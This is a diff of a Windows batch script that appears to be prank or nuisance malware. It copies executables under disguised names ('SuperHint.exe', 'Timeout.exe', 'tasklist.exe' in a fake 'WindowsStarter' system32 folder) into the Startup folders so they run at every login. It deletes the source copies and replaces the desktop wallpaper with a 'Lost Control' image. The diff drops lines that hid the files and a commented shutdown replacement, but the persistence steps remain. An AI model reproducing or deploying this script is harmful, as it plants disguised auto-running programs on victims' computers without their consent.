@@ -31,18 +31,13 @@ if exist %windir%\system32\WindowsStarter\tasklist.exe del a2list.exe
 copy dont.jpg "%localappdata%\Lost Control\dont.jpg"/y
 if exist "%localappdata%\Lost Control\dont.jpg" del dont.jpg/q
 
-rem copy a3down.exe "%windir%\system32\WindowsStarter\shutdown.exe"/y
-rem if exist %windir%\system32\WindowsStarter\shutdown.exe del a3down.exe/q
 
 copy a4hint.exe "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SuperHint.exe"/y
 if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SuperHint.exe" del a4hint.exe/q
-attrib +h "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SuperHint.exe"
 
 copy a5time.exe "%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.exe"/y
 if exist "%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.exe" del a5time.exe/q
-attrib +h "%systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Timeout.exe"
 
-rem reg add HKCU\software\Microsoft\Windows\CurrentVersion\RunOnce /v SuperHint /t REG_SZ /d %windir%\system32\SuperHint.exe /f
 
 
 reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%localappdata%\Lost Control\dont.jpg" /f
